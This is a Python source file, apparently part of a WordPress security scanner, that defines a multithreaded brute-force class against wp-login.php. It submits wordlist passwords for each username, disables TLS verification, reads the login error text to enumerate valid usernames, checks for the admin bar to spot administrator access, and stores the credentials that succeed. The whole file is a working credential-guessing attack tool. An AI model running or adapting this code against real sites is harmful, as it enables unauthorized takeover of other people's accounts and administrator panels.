from urllib.parse import urlparse, urlunparse
from concurrent.futures import ThreadPoolExecutor

import requests
from bs4 import BeautifulSoup
import keyboard


class Bruteforce:
    def __init__(self, scanner) -> None:
        self.__url: str = scanner.url
        self.__user_agent: str = scanner.user_agent
        self.__usernames = scanner.usernames
        self.__passwords = self.set_passwords()
        self.__logins = scanner.logins
        self.__admin = scanner.admin
        self.__stop = False  # Add a stop flag
        self.next = False

    def stop(self, e=None):  # Add a method to set the stop flag
        self.__stop = True

    def set_passwords(self, filepath="src/db/passwords.txt"):
        with open(filepath, "r") as file:
            passwords = file.read().splitlines()
        return passwords

    @property
    def user_agent(self) -> str:
        return self.__user_agent

    @property
    def admin(self) -> dict:
        return self.__admin

    @property
    def passwords(self):
        return self.__passwords

    @property
    def users(self):
        return self.__usernames

    @property
    def logins(self):
        return self.__logins

    @property
    def url(self) -> str:
        parsed_url = urlparse(self.__url)
        if parsed_url.scheme == "http":
            parsed_url = parsed_url._replace(scheme="https")
        url = urlunparse(parsed_url)
        return url

    def __sign_in(self, session, username, password):
        keyboard.on_press_key("q", self.stop)  # Stop on 'q' key press

        slug: str = "wp-login.php"
        login_data = {
            "log": username,
            "pwd": password,
            "wp-submit": "Log In",
            "redirect_to": f"{self.url}wp-admin/",
            "testcookie": "1",
        }
        login_cookie = "wordpress_test_cookie=WP Cookie check"

        res = session.post(
            self.url + slug,
            headers={
                "Cookie": login_cookie,
                "User-Agent": self.user_agent,
            },
            verify=False,
            data=login_data,
        )
        res = BeautifulSoup(res.text, "html.parser")
        error = res.find("div", {"id": "login_error"})
        if error:
            error_msg = error.text.strip()
            if (
                error_msg
                == f"Error: The password you entered for the username {username} is incorrect. Lost your password?"
            ):
                self.__usernames.add(username)
            elif (
                error_msg
                == f"Error: The username {username} is not registered on this site. If you are unsure of your username, try your email address instead."
            ):
                self.next = True

            print(f"Login failed with message: {error_msg}")
            session.close()
            return False

        wpadminbar = res.find("body").find("div", {"id": "wpadminbar"})
        if wpadminbar:
            print(f"Successful login with {username}:{password} (admin)")
            self.__admin[username] = password
            session.close()
            return "success"
        else:
            print(f"Successful login with {username}:{password} (not admin)")
            self.__logins[username] = password
            session.close()
            return "success"

    def try_to_sign_in(self, username, password):
        with requests.Session() as s:
            self.__sign_in(s, username, password)

    def bruteforce(self, usernames=False, passwords=False, max_workers=10):
        if not usernames:
            usernames = self.users
        if not passwords:
            passwords = self.passwords
        self.__stop = False  # Reset the stop flag
        print("Press 'q' to stop the bruteforce.")
        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            with requests.Session() as session:
                for username in usernames:
                    if self.__stop:  # Check the stop flag
                        print("Bruteforce stopped.")
                        break
                    if executor._shutdown:
                        break
                    tasks = []
                    for password in passwords:
                        if self.__stop:  # Check the stop flag
                            break
                        task = executor.submit(
                            self.__sign_in, session, username, password
                        )
                        if not any(task.result() for task in tasks):
                            tasks.append(task)
                        if task.result() == "success":
                            break

    def bruteforce3(self, usernames=False, passwords=False, max_workers=10):
        if not usernames:
            usernames = self.users
        if not passwords:
            passwords = self.passwords
        self.__stop = False  # Reset the stop flag
        print("Press 'q' to stop the bruteforce.")
        keyboard.on_press_key("q", lambda _: setattr(self, "__stop", True))

        with ThreadPoolExecutor(max_workers=max_workers) as executor:
            tasks = []  # Move the tasks list outside the usernames loop
            for username in usernames:
                if self.__stop:  # Check the stop flag
                    print("Bruteforce stopped.")
                    break
                for password in passwords:
                    if self.__stop:  # Check the stop flag
                        break
                    if self.next:
                        self.next = False
                        break
                    with requests.Session() as session:  # Create a new session for each username
                        task = executor.submit(
                            self.__sign_in, session, username, password
                        )
                        tasks.append(
                            task
                        )  # Add the task to the tasks list without waiting for it to complete

        # After all tasks have been submitted, wait for their results
        for task in tasks:
            if task.result() is False:
                print("Task failed.")
